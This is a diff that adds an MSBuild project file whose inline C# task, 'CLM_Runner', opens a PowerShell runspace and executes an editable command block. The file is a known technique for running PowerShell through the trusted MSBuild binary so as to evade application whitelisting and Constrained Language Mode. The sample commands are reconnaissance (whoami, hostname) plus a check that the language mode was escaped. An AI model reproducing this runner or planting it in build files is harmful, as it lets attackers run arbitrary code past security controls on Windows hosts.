@@ -1,0 +1,58 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+<Target Name="Execute_CLM_Runner">
+<CLM_Runner />
+</Target>
+<UsingTask TaskName="CLM_Runner" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+<Task>
+<Reference Include="System.Management.Automation" />
+<Code Type="Class" Language="cs">
+<![CDATA[
+
+            using System;
+            using System.Linq;
+            using System.Management.Automation;
+            using System.Management.Automation.Runspaces;
+
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+
+            public class CLM_Runner :  Task, ITask
+            {
+                public override bool Execute()
+                {
+                    using (var runspace = RunspaceFactory.CreateRunspace())
+                    {
+                      runspace.Open();
+
+                      using (var PWSH = PowerShell.Create())
+                      {
+                        PWSH.Runspace = runspace;
+			
+			// Start
+			string Command = @"
+			
+			whoami
+			hostname
+			get-date
+			$ExecutionContext.SessionState.LanguageMode
+			";
+			//End
+                        
+			PWSH.AddScript(Command);
+                                                
+                        var results = PWSH.Invoke();
+                        var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
+                        
+                        Console.WriteLine(output);
+                      }
+                    }
+
+                return true;
+              }
+            }
+
+]]>
+</Code>
+</Task>
+</UsingTask>
+</Project>
